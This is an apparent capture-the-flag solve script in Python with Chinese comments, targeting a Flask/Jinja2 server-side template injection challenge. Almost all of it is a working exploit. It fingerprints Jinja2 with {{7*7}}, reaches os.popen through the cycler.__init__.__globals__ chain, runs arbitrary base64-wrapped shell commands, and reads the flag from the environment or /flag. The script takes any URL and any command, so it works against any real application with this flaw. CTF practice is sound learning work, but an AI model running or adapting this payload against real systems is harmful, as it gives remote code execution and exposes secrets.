#!/usr/bin/env python3
"""
0xGame 2026 — 题目 2 · 渲染如呼吸一样简单 (Web / SSTI, 718 pts)

漏洞: /render 直接调用 Flask 的 render_template_string()，把用户 POST 的
      `template` 表单字段当 Jinja2 模板渲染 -> 服务端模板注入 (SSTI) -> RCE。

利用链: {{ cycler.__init__.__globals__.os.popen('<cmd>').read() }}
        cycler 是 Jinja2 全局函数，其 __init__ 是 Python 函数，
        __globals__ 暴露 jinja2.utils 模块的全局命名空间，
        其中已 import 了 os -> 直接拿 os.popen 执行命令。

flag 位置: 容器 env 里的 FLAG 变量（entrypoint.sh 把它写进 /flag 并 chmod 0400
           root 所有，ctf 用户读不到文件，但 env 可读）。

用法:
    python3 scripts/2-solve.py                 # 默认打 brief 里的目标
    python3 scripts/2-solve.py <url>           # 覆盖目标
    python3 scripts/2-solve.py <url> 'id; ls'  # 执行任意命令
"""
import base64
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

DEFAULT_URL = ("http://5000-c1dee23f-2f68-4622-89e0-f14236b1a531"
               ".challenge.ctfplus.cn")


def render(base_url, template, timeout=25):
    """POST 一个模板片段，返回 <div class="preview"> 里的渲染结果。"""
    data = urllib.parse.urlencode({"template": template}).encode()
    req = urllib.request.Request(base_url.rstrip("/") + "/render", data=data)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace")
    m = re.search(r'<div class="preview[^"]*">(.*?)</div>', body, re.S)
    return m.group(1).strip() if m else "[no preview div]\n" + body[:1000]


def rce(base_url, cmd):
    """base64 包装命令，避免引号/特殊字符破坏模板语法。"""
    b64 = base64.b64encode(cmd.encode()).decode()
    tpl = ("{{ cycler.__init__.__globals__.os.popen("
           "'echo %s | base64 -d | sh').read() }}" % b64)
    return render(base_url, tpl)


def main():
    base_url = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_URL

    if len(sys.argv) > 2:
        print(rce(base_url, " ".join(sys.argv[2:])))
        return

    # 1) 指纹：{{7*7}} -> 49 且 {{7*'7'}} -> 7777777  =>  Jinja2 (Twig 会是 49)
    a = render(base_url, "{{7*7}}")
    b = render(base_url, "{{7*'7'}}")
    print("[*] {{7*7}}   =", a)
    print("[*] {{7*'7'}} =", b)
    if a != "49" or b != "7777777":
        print("[!] 不是预期的 Jinja2 行为，后续 payload 可能需调整")
    else:
        print("[+] 指纹: Jinja2 / Flask")

    # 2) RCE 验证
    print("[*] id ->", rce(base_url, "id"))

    # 3) 取 flag：env 里有 FLAG（/flag 是 root:0400，ctf 读不到）
    flag = rce(base_url, "printenv FLAG || cat /flag 2>/dev/null")
    print("[*] FLAG:", flag)
    m = re.search(r"0xGame\{[^}]+\}|flag\{[^}]+\}", flag)
    if m:
        print("\n[+] FLAG =", m.group(0))
        print("[*] 提交: python3 scripts/ctfplus.py submit 2 '%s'" % m.group(0))
    else:
        print("\n[-] 没匹配到 flag，手工看上面的输出")


if __name__ == "__main__":
    main()
